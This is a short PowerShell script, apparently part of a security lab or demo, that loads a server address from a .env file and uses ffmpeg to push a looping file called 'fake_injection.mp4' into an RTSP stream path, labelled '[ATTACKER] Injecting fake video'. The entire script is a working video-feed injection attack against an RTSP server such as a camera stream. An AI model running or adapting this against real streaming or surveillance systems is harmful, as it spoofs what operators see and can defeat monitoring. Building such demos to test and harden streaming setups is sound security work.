param()
$ErrorActionPreference = 'Stop'
$envPath = Join-Path $PSScriptRoot '..' '.env'
$videoDir = Join-Path $PSScriptRoot '..' 'video'
if (Test-Path $envPath) {
  Get-Content $envPath | Where-Object { $_ -match '^[A-Za-z_][A-Za-z0-9_]*=' } | ForEach-Object {
    $name, $value = $_ -split '=', 2; [Environment]::SetEnvironmentVariable($name, $value)
  }
}

$server = $env:SERVER_IP; if (-not $server) { throw "Set SERVER_IP in .env" }
$port   = $env:RTSP_PORT; if (-not $port)   { $port = 8554 }
$fake   = Join-Path $videoDir 'fake_injection.mp4'
if (-not (Test-Path $fake)) { throw "Fake video not found: $fake" }

Write-Host "[ATTACKER] Injecting fake video to rtsp://$server`:$port/live.sdp"
ffmpeg -re -stream_loop -1 -i "$fake" -c copy -f rtsp "rtsp://$server`:$port/live.sdp"
